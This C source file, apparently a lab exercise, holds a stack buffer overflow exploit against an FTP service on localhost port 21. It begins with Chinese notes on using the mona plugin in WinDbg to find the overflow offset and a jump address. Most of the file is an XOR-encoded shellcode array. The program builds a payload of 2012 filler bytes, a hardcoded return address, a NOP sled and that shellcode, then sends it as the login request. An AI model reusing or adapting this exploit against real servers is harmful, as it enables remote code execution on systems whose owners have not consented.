/*
mona使用笔记:
开始指令:
	.load pykd.pyd
	!py mona
设置工作目录:
	!py mona config -set workingfolder  "d:\"
生成测试文件:
	!py  mona pc 1000

获取溢出点:
	!py mona po 崩溃的eip
获取的是文件偏移


32位绝杀地址:0x7FFA4512



*/


#include <stdio.h>
#include <winsock2.h>
#pragma  comment(lib, "Ws2_32.lib")


unsigned char bShellCode[] = {
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0xE8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x5B, 0x8D, 0x73, 0x19, 0x33, 0xC9, 0x66, 0xB9, 0x75, 0x02, 0x8A, 0x04, 0x0E, 0x34, 0x12, 0x88, 0x04, 0x0E, 0xE2, 0xF6,
	0x80, 0x34, 0x0E, 0x12, 0x91, 0xFE, 0x32, 0x47, 0x99, 0xFE, 0x91, 0xFE, 0x02, 0xF9, 0x32, 0x71, 0x7F, 0x76, 0x3C, 0x77, 0x6A, 0x77, 0x12, 0x65, 0x61, 0x20, 0x4D, 0x21, 0x20, 0x3C, 0x76, 0x7E,
	0x7E, 0x12, 0x79, 0x77, 0x60, 0x7C, 0x77, 0x7E, 0x21, 0x20, 0x3C, 0x76, 0x7E, 0x7E, 0x12, 0xFA, 0x12, 0x12, 0x12, 0x12, 0x49, 0x9B, 0x4F, 0xEE, 0x76, 0x99, 0x27, 0x22, 0x12, 0x12, 0x12, 0x99,
	0x64, 0x1E, 0x99, 0x64, 0x0E, 0x99, 0x24, 0x99, 0x44, 0x1A, 0x40, 0x7A, 0x95, 0x20, 0xCA, 0xD2, 0xFA, 0xA8, 0x13, 0x12, 0x12, 0x99, 0xEA, 0x9F, 0x61, 0xFC, 0x78, 0x12, 0x78, 0x12, 0x44, 0xED,
	0xC5, 0x9B, 0x57, 0xEA, 0x9F, 0x61, 0xF1, 0x78, 0x12, 0x78, 0x12, 0x44, 0xED, 0xC5, 0x9B, 0x57, 0xE6, 0xED, 0x67, 0xE6, 0xED, 0x67, 0xEA, 0xED, 0x67, 0xEE, 0xFA, 0x03, 0x12, 0x12, 0x12, 0xED,
	0x67, 0xEA, 0x7A, 0x71, 0x9B, 0xC3, 0x5D, 0xFA, 0x91, 0x13, 0x12, 0x12, 0x78, 0x12, 0xED, 0xC2, 0x47, 0x99, 0xFE, 0x93, 0xFE, 0x12, 0x11, 0x12, 0x12, 0xED, 0x67, 0x02, 0x7A, 0x2F, 0x78, 0xA6,
	0x92, 0xFA, 0x7B, 0x13, 0x12, 0x12, 0x9F, 0xA7, 0x12, 0xEF, 0xED, 0xED, 0x44, 0x7A, 0x10, 0x10, 0x12, 0x12, 0xED, 0xC2, 0x97, 0xD2, 0x1D, 0x97, 0xED, 0x12, 0x12, 0x12, 0xED, 0x67, 0x02, 0x7A,
	0x3F, 0x20, 0x6A, 0xCC, 0xFA, 0x54, 0x13, 0x12, 0x12, 0x78, 0x12, 0x78, 0x12, 0x78, 0x12, 0x78, 0x14, 0x78, 0x13, 0x78, 0x10, 0xED, 0xC2, 0x9B, 0x57, 0xEE, 0xED, 0x67, 0x02, 0x7A, 0x76, 0x02,
	0xB5, 0xCF, 0xFA, 0x3A, 0x13, 0x12, 0x12, 0x74, 0xD5, 0x97, 0x12, 0xEC, 0xED, 0xED, 0x10, 0x12, 0x74, 0xD5, 0x97, 0x10, 0xEC, 0xED, 0xED, 0x17, 0xF9, 0xD5, 0x97, 0x16, 0xEC, 0xED, 0xED, 0x12,
	0x12, 0x12, 0x12, 0x9F, 0xA7, 0x12, 0xEC, 0xED, 0xED, 0x78, 0x06, 0x44, 0xED, 0x67, 0xEE, 0xED, 0xC2, 0x97, 0xD2, 0x1D, 0x97, 0xB0, 0x12, 0x12, 0x12, 0xED, 0x67, 0x02, 0x7A, 0x1E, 0x8D, 0xC1,
	0x59, 0xFA, 0xFB, 0x12, 0x12, 0x12, 0x7A, 0xED, 0xED, 0xED, 0x6D, 0xED, 0x67, 0xEE, 0xED, 0xC2, 0x97, 0xD2, 0x1D, 0x97, 0x91, 0x12, 0x12, 0x12, 0xED, 0x67, 0x02, 0x7A, 0xA3, 0x0C, 0x85, 0x13,
	0xFA, 0xD8, 0x12, 0x12, 0x12, 0x78, 0x12, 0x78, 0x12, 0xED, 0x67, 0xEE, 0xED, 0xC2, 0x9B, 0x57, 0xEE, 0xED, 0x67, 0x1E, 0x7A, 0xDB, 0xAE, 0xB4, 0x79, 0xFA, 0xA3, 0x12, 0x12, 0x12, 0x99, 0xC2,
	0x9F, 0xAF, 0x62, 0xED, 0xED, 0xED, 0xAB, 0x03, 0x12, 0x12, 0x12, 0xAA, 0x12, 0x12, 0x12, 0x12, 0xEE, 0xE1, 0xB9, 0xD5, 0x97, 0x62, 0xED, 0xED, 0xED, 0x56, 0x12, 0x12, 0x12, 0xD5, 0x57, 0x8E,
	0x12, 0x13, 0x12, 0x12, 0x74, 0xD5, 0x57, 0xB2, 0x12, 0x12, 0x99, 0x67, 0xEE, 0x9B, 0x67, 0xBA, 0x9B, 0x67, 0xBE, 0x9B, 0x67, 0xA2, 0x9F, 0xA7, 0x62, 0xED, 0xED, 0xED, 0x9F, 0xAF, 0x12, 0xEC,
	0xED, 0xED, 0x99, 0x4F, 0x1A, 0x9F, 0x49, 0xC9, 0x45, 0x44, 0x78, 0x12, 0x78, 0x12, 0x78, 0x12, 0x78, 0x13, 0x78, 0x12, 0x78, 0x12, 0x41, 0x78, 0x12, 0xED, 0xC0, 0x99, 0xF7, 0x4F, 0xD0, 0x1E,
	0x12, 0x47, 0x99, 0xFE, 0x91, 0xFE, 0x16, 0xD5, 0x57, 0xEE, 0x12, 0x12, 0x12, 0x12, 0x41, 0x43, 0x40, 0x99, 0x67, 0x1A, 0x21, 0xDB, 0x21, 0xD2, 0x98, 0x16, 0x1C, 0x96, 0xD2, 0x66, 0x04, 0x99,
	0x4F, 0xEE, 0xD3, 0xF1, 0x0B, 0x99, 0x47, 0xEE, 0xD3, 0xF8, 0x15, 0x19, 0xC8, 0x11, 0xCA, 0x9B, 0x4F, 0xEE, 0x53, 0xF9, 0xF1, 0x99, 0x4F, 0x1E, 0x99, 0x47, 0xEE, 0x21, 0xD2, 0x29, 0xC8, 0x67,
	0x17, 0xAA, 0x13, 0x12, 0x12, 0x12, 0x48, 0x4B, 0x49, 0x99, 0xF7, 0x4F, 0xD0, 0x1A, 0x12, 0x47, 0x99, 0xFE, 0x91, 0xFE, 0x1E, 0x40, 0x99, 0x47, 0x1E, 0x99, 0x60, 0x2E, 0x9F, 0x26, 0x20, 0x99,
	0x64, 0x6A, 0x9F, 0x26, 0x20, 0x99, 0x6C, 0x0E, 0x9F, 0x2E, 0x28, 0x9B, 0x6F, 0xEE, 0x99, 0x6C, 0x32, 0x9F, 0x2E, 0x28, 0x9B, 0x6F, 0xEA, 0x99, 0x6C, 0x36, 0x9F, 0x2E, 0x28, 0x9B, 0x6F, 0xE6,
	0x21, 0xDB, 0xF9, 0x13, 0x53, 0x99, 0x67, 0xEA, 0x99, 0x26, 0x9C, 0x99, 0x47, 0x1E, 0x9F, 0x26, 0x20, 0xED, 0x67, 0x1A, 0x44, 0xFA, 0x75, 0xED, 0xED, 0xED, 0x97, 0xD2, 0x66, 0xF4, 0x99, 0x67,
	0xE6, 0x21, 0xED, 0x74, 0x99, 0x2E, 0x5C, 0x99, 0x47, 0xEE, 0x99, 0x26, 0xA8, 0x99, 0x47, 0x1E, 0x9F, 0x16, 0x20, 0x48, 0x99, 0xF7, 0x4F, 0xD0, 0x1A, 0x12,
	0x00 //以0结尾方便字符串代码编写
};

char bFill[5000] = { 0 };
char bExpolit[5000] = { 0 };
char bNop[51] = { 0 };
//char nRetnAddr[] = "\x25\x8C\x75\x75";
char nRetnAddr[] = "\xe7\xe1\x37\x77";
int main(int argc, char* argv[])
{


	//1. 初始化winsocket服务
	WSADATA stWSA;
	WSAStartup(0x0202, &stWSA);

	//2. 创建一个原始套接字
	SOCKET stListen = INVALID_SOCKET;
	stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	//3. 绑定端口
	SOCKADDR_IN stService;
	stService.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	stService.sin_port = htons(21);
	stService.sin_family = AF_INET;
	connect(stListen, (SOCKADDR*)&stService, sizeof(stService));

	//4. 接受欢迎语
	char szRecv[0x100] = { 0 };
	recv(stListen, szRecv, sizeof(szRecv), 0);

	//5. 构造bExpolit
	memset(bFill, 'A', 2012);
	memset(bNop, '\x90', 50);
	sprintf_s(bExpolit, _countof(bExpolit), "%s%s%s%s", bFill, nRetnAddr, bNop, bShellCode);

	//5.发送登陆请求
	send(stListen, bExpolit, sizeof(bExpolit), 0);
	recv(stListen, szRecv, sizeof(szRecv), 0);

	//6. 释放资源
	WSACleanup();

	return 0;
}